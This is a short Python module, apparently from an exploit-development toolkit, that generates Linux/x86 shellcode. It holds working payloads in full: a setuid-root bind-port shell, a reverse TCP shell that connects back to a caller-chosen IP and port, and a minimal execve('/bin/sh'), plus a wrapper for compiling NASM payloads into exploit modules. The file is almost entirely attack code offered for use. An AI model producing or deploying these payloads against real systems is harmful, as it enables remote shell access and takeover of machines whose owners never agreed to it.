#!/usr/bin/python
# coding:  UTF-8
import struct, socket
from bytecode import bc

def bytecode(nasm_src):
    """
    Simple wrapper on hj's bytecode utilite
    to use it in your exploits modules

    return compiled opcodes from your nasm-src file

    examlpe of nasm-src file in excve.asm or sh.asm
    """
    opcodes = bc(nasm_src, hdd=False, rembin=True, shctest=False)
    return opcodes


class linux(object):

    def bindport(self, port):
        """
        /*
         * shellcode = bind(5555)
         * create bind-port shellcode
         * simple.
         *
         * Based on:
         *
         * $Id: portbind-linux.c,v 1.4 2004/06/02 12:22:30 raptor Exp $
         *
         * portbind-linux.c - setuid/portbind shellcode for Linux/x86
         * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
         *
         * Simple portbind shellcode that bind()'s a setuid(0) shell
         * (based on bighawk's code).
         *
         * Tested on Linux.
         *
         */
         """

        port = struct.pack(">I", port)
        port = port[2:]
        
        shellcode = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" \
        +"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80" \
        +"\x89\xc7\x52\x66\x68" \
        + port \
        +"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80" \
        +"\xb0\x66\xb3\x04\xcd\x80" \
        +"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80" \
        +"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80" \
        +"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80"

        return shellcode


    def reverse_tcp(self, locip, locport):
        """
        /* 
         * shellcode = reverse_tcp('192.168.1.1', 5555)
         * connects to 192.168.1.1:5555 your listen tcp-socket
         *
         * Based on:
         * linux/x86/shell_reverse_tcp - 71 bytes
         * http://www.metasploit.com
         * VERBOSE=false
         *
         */
        """
        
        locip = socket.inet_aton(locip)

        locport = struct.pack(">I", locport)
        locport = locport[2:]

        #\x11\x5c
        
        reverse_shell_remote = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
        +"\x5b\x5e\x68" + locip + "\x66\x68" + locport + "\x66\x53\x6a\x10" \
        +"\x51\x50\x89\xe1\x43\x6a\x66\x58\xcd\x80\x59\x87\xd9\xb0\x3f" \
        +"\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
        +"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

        return reverse_shell_remote

    def bin_sh():
        """
        /*
         * Super-small excve
         *
         * Title:    Linux x86 execve("/bin/sh",0,0) - 21 bytes
         * Author:   honeyjonny <honeyjonny@gmail.com>
         *
         */
        """
        bin_sh_shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
        return bin_sh_shellcode
